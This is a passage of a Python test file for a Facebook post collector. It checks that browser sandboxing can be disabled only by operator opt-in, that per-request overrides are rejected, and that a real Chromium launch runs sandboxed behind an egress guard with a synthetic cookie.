    ctx = app.AppContext.open(ctx.paths.root)
    launches = []

    class FakeLauncherDriver(facebook.FixtureBrowserDriver):
        def sandbox_available(self):
            return verified

        def open_session(self, *args, **kwargs):
            launches.append(kwargs["allow_unsandboxed_browser"])
            if not verified and not kwargs["allow_unsandboxed_browser"]:
                raise m.CoreError(
                    m.ErrorCode.DEPENDENCY_MISSING,
                    "Sandbox unavailable",
                    next_action=facebook.SANDBOX_NEXT_ACTION,
                )
            return super().open_session(*args, **kwargs)

    driver = FakeLauncherDriver(observation(_synthetic_post_html()))
    facebook.set_driver_factory(lambda: driver)
    inspected = app.inspect_capabilities(ctx, {})
    row = next(
        r for r in inspected.data["capabilities"] if r["name"] == "metamuse_collect.facebook_post"
    )
    assert row["environment"] == environment
    assert (facebook.SANDBOX_DISABLED_WARNING in inspected.warnings) == opt_in
    job_id = submit(ctx, project, permit)
    job = finish(ctx, job_id)
    mode = "disabled_by_operator" if opt_in else "enabled"
    assert launches == [opt_in]
    if environment == "unavailable":
        assert job["error"]["code"] == "E_DEPENDENCY_MISSING"
    else:
        assert job["result"]["data"]["steps"][0]["data"]["browser_sandbox"] == mode
    step = app.get_job(ctx, {"job_id": job_id}).data["steps"][0]
    assert step["checkpoint"]["browser_sandbox"] == mode
    request = {
        "project_id": project,
        "inputs": [{"kind": "url", "url": URL}],
        "resources": ["post"],
        "request_key": "invalid-override",
        "allow_unsandboxed_browser": True,
    }
    assert app.submit_collect(ctx, request).error.code == m.ErrorCode.INPUT_INVALID


def test_real_sandboxed_launch_or_explicit_skip(tmp_path, monkeypatch):
    if facebook.find_playwright_browser() is None:
        pytest.skip("Playwright or Chromium is not installed")
    _allow_loopback_sockets(monkeypatch)
    for key in facebook.PROXY_ENV_VARS:
        monkeypatch.delenv(key, raising=False)
    prefix = "SYNTH"
    state = facebook.sanitize_storage_state(
        json.dumps(
            {
                "cookies": [
                    {"name": "fixture", "value": f"{prefix}_COOKIE", "domain": "www.facebook.com"}
                ]
            }
        ).encode()
    )
    guard = facebook.EgressGuard(allowed_hosts=("www.facebook.com",), resolver=lambda _: [])
    try:
        session = facebook.PlaywrightBrowserDriver().open_session(state, guard, timeout_ms=5000)
    except m.CoreError as error:
        assert error.detail.code == m.ErrorCode.DEPENDENCY_MISSING
        pytest.skip("Sandboxed Chromium unavailable; install an AppArmor userns profile")
    try:
        args = session._browser.new_browser_cdp_session().send("Browser.getBrowserCommandLine")
        assert "--no-sandbox" not in args["arguments"]
        assert session._page.url == "about:blank"
    finally:
        session.close()
